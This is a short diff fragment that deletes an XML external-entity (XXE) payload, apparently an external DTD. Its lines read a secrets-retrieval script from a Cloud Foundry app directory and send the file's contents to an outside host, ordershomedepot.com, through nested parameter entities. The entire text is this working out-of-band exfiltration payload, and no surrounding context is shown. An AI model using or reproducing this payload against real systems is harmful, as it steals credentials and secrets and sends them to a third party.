@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///home/vcap/app/.profile.d/0001_retrieve-secrets.sh">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ordershomedepot.com/?xxe=%file;'>">
-%eval;
-%exfiltrate;
